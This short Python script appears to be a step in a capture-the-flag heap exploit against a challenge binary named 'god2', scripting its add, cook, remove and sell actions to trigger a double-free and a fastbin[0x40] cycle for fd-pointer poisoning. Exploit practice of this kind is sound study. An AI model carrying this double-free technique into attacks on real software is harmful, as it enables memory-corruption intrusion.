import sys,os,subprocess; sys.path.insert(0,'/mnt/c/Users/ha/Downloads/pwn')
from dumper import G
# Goal: after dish double-free (fastbin[0x40] cycle D3,E), cook with a controlled NAME
# to set the fastbin fd, and verify next cook returns the controlled address.
g=G('god2')
g.add(b'UNIQ777',(b'0',))
g.add(b'A1'); g.add(b'B2'); g.cook(b'Beef noodles'); g.add(b'YY'); g.add(b'Z9'); g.cook(b'Beef noodles')
for t in (b'B2',b'Z9',b'A1',b'YY'): g.rm(t)
g.add(b'CC')
g.cook(b'Beef noodles'); g.cook(b'Beef noodles'); g.cook(b'UNIQ777'); g.cook(b'Beef noodles')  # D1,D2,D3@YY,E
g.sell(b'5')                 # free E
g.rm(b'UNIQ777'); g.rm(b'UNIQ777')   # free recipe + free D3 => fastbin[0x40]=[D3,E,D3...]
g.dump('after double-free: fastbin[0x40] cycle')
g.close()
